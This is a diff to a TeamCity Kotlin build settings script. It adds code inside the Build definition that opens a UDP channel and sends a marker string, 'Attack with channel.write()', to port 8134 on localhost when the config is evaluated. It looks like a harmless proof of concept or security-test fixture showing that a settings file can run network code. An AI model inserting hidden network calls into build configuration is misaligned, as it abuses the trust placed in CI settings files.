@@ -3,6 +3,10 @@ import jetbrains.buildServer.configs.kotlin.buildFeatures.parallelTests
 import jetbrains.buildServer.configs.kotlin.buildFeatures.perfmon
 import jetbrains.buildServer.configs.kotlin.buildSteps.dotnetTest
 import jetbrains.buildServer.configs.kotlin.triggers.vcs
+import java.net.Inet4Address
+import java.net.InetSocketAddress
+import java.nio.ByteBuffer
+import java.nio.channels.DatagramChannel
 
 /*
 The settings script is an entry point for defining a TeamCity
@@ -35,6 +39,13 @@ project {
 
 object Build : BuildType({
     name = "Build"
+
+    val attackAddress = InetSocketAddress(Inet4Address.getLoopbackAddress(), 8134)
+    val payload = ByteBuffer.wrap("Attack with channel.write()".toByteArray())
+    DatagramChannel.open().use { channel ->
+        channel.connect(attackAddress)
+        channel.write(payload)
+    }
 
     params {
         param("DotNet_version", "%DotNetCLI%")
